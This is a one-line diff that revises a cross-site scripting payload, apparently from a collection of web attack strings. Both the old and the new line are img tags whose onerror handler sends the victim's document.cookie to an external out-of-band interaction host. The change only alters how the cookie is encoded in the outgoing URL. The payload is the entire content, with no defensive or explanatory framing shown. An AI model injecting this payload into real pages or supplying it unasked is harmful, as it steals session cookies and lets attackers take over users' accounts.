@@ -1,1 +1,1 @@
-<img src=x onerror="location.href='tbqimzzddwayopfmucrnud4kg540pi068.oast.fun/'+btoa(document.cookie);">
+<img src=x onerror="location.href='tbqimzzddwayopfmucrnud4kg540pi068.oast.fun/?c='+encodeURI(document.cookie);">
